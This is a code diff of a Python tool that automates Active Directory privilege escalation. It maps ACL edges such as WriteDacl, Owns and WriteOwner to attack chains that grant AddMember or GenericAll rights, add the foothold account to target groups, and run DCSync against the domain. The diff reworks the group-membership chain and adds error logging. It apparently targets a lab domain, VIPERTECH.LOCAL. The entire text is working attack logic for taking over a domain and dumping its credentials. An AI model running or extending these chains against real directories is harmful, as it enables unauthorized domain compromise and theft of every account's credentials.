@@ -39,10 +39,10 @@ STRICT_EDGE_ACTIONS = {
     ("WriteDacl", "Group"): "grant_addmember_then_add_group_member",
     ("WriteDacl", "Domain"): "grant_genericall_then_dcsync",
     ("Owns", "User"): "take_ownership_grant_genericall_then_reset_password",
-    ("Owns", "Group"): "take_ownership_grant_addmember_then_add_group_member",
+    ("Owns", "Group"): "grant_addmember_then_add_group_member",
     ("Owns", "Domain"): "take_ownership_grant_genericall_then_dcsync",
     ("WriteOwner", "User"): "take_ownership_grant_genericall_then_reset_password",
-    ("WriteOwner", "Group"): "take_ownership_grant_addmember_then_add_group_member",
+    ("WriteOwner", "Group"): "grant_addmember_then_add_group_member",
     ("WriteOwner", "Domain"): "take_ownership_grant_genericall_then_dcsync",
     ("ForceChangePassword", "User"): "reset_password",
 }
@@ -253,90 +253,71 @@ def execute_strict_action_plan(plan, actions, context):
             continue
 
         if action == "grant_addmember_then_add_group_member":
-            if not target_dn or not current_sid:
-                logging.error("WRITE_DACL/OWNS/WRITE_OWNER GROUP: unable to resolve target DN or current SID")
-                return False
-            if not _grant_group_addmember(actions, target_dn, current_sid):
-                return False
-            if not _refresh_bind(actions, context):
-                return False
-            current_user_dn = _resolve_current_user_dn(actions, context)
-            if not current_user_dn:
-                logging.error("WRITE_DACL/OWNS/WRITE_OWNER GROUP: unable to resolve current user DN")
-                return False
-            if not _safe_call("add_group_member", actions.add_group_member, target_dn, current_user_dn):
-                return False
-            if not _refresh_bind(actions, context):
-                return False
-            continue
-
-        if action == "grant_genericall_then_reset_password":
-            if not target_dn or not current_sid:
-                logging.error("WRITE_DACL/OWNS/WRITE_OWNER USER: unable to resolve target DN or current SID")
-                return False
-            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
-                return False
-            if not _refresh_bind(actions, context):
-                return False
-            if not _safe_call("force_change_password", actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD):
-                return False
-            bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
-            context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
-            if not _switch_identity_after_reset(actions, context, item["end_node"], target_dn):
-                return False
-            continue
-
-        if action == "grant_genericall_then_dcsync":
-            if not target_dn or not current_sid:
-                logging.error("WRITE_DACL/OWNS/WRITE_OWNER DOMAIN: unable to resolve target DN or current SID")
-                return False
-            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
-                return False
-            if not _refresh_bind(actions, context):
-                return False
-            if not current_password or not _safe_call("dcsync", actions.dcsync, current_password):
-                return False
-            continue
-
-        if action == "take_ownership_grant_addmember_then_add_group_member":
             if not target_dn:
-                logging.error("GROUP OWNERSHIP CHAIN: unable to resolve target DN")
+                logging.error("GROUP ADDMEMBER CHAIN: unable to resolve target DN")
                 return False
 
             grant_actor = context.current_identity or SOURCE_USER
             grant_actor_dn = _resolve_source_user_dn(actions, grant_actor)
             grant_actor_sid = _canonicalize_sid(actions.get_object_sid(grant_actor))
-            target_member = "MIKE_INTERN@VIPERTECH.LOCAL"
-            target_member_dn = _resolve_source_user_dn(actions, target_member)
-            if not grant_actor_dn or not grant_actor_sid or not target_member_dn:
-                logging.error("GROUP OWNERSHIP CHAIN: unable to resolve the operator or member identity")
+            if not grant_actor_dn or not grant_actor_sid:
+                logging.error("GROUP ADDMEMBER GRANT: unable to resolve the foothold identity")
                 return False
 
-            owner_sid = actions.get_owner_sid(target_dn)
-            if owner_sid and owner_sid == grant_actor_sid and actions.is_member_of_group(target_dn, target_member_dn):
-                if context.switch_identity(target_member) and _refresh_bind(actions, context):
-                    logging.info(f"  [+] Reused satisfied ownership state and pivoted execution identity to {target_member}")
-                logging.info(f"  [+] {target_member} already has AddMember rights and is already in {target_name}; no additional change required.")
-                continue
-
-            if owner_sid != grant_actor_sid:
-                if not _safe_call("set_owner", actions.set_owner, target_dn, grant_actor_sid):
-                    return False
-                if not _refresh_bind(actions, context):
-                    return False
-
+            logging.info("  [*] Granting AddMember on %s for %s", target_name, grant_actor)
             if not _grant_group_addmember(actions, target_dn, grant_actor_sid):
+                logging.error(
+                    "GROUP ADDMEMBER GRANT: failed to grant AddMember on %s for %s (ldap_result=%s, diagnostic=%s)",
+                    target_name,
+                    grant_actor,
+                    getattr(actions.conn, "result", {}),
+                    getattr(actions, "last_group_member_message", None),
+                )
                 return False
             if not _refresh_bind(actions, context):
+                logging.error("GROUP ADDMEMBER GRANT: rebind failed after grant")
                 return False
 
-            if not context.switch_identity(target_member):
-                logging.error("GROUP OWNERSHIP CHAIN: could not switch to MIKE_INTERN after grant")
+            logging.info("  [+] Granted AddMember on %s for %s", target_name, grant_actor)
+
+            if not context.switch_identity(grant_actor):
+                logging.error("GROUP ADDMEMBER GRANT: context switch failed after grant")
                 return False
             if not _refresh_bind(actions, context):
+                logging.error("GROUP ADDMEMBER GRANT: rebind failed after context switch")
                 return False
 
-            if not _safe_call("add_group_member", actions.add_group_member, target_dn, target_member_dn):
+            current_user_dn = _resolve_current_user_dn(actions, context)
+            if not current_user_dn:
+                logging.error("GROUP ADDMEMBER ADD: unable to resolve current user DN after pivot")
+                return False
+
+            if not _safe_call("add_group_member", actions.add_group_member, target_dn, current_user_dn):
+                logging.error(
+                    "GROUP ADDMEMBER ADD: failed to add %s to %s (ldap_result=%s, diagnostic=%s)",
+                    grant_actor,
+                    target_name,
+                    getattr(actions.conn, "result", {}),
+                    getattr(actions, "last_group_member_message", None),
+                )
+                return False
+            if not _refresh_bind(actions, context):
+                logging.error("GROUP ADDMEMBER ADD: rebind failed after membership add")
+                return False
+            continue
+
+        if action == "grant_genericall_then_dcsync":
+            if not target_dn or not current_sid:
+                logging.error("DOMAIN GRANT CHAIN: unable to resolve target DN or current SID")
+                return False
+            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
+                logging.error("DOMAIN GRANT CHAIN: failed to grant GenericAll")
+                return False
+            if not _refresh_bind(actions, context):
+                logging.error("DOMAIN GRANT CHAIN: rebind failed after grant")
+                return False
+            if not current_password or not _safe_call("dcsync", actions.dcsync, current_password):
+                logging.error("DOMAIN GRANT CHAIN: DCSync failed after grant")
                 return False
             continue
 
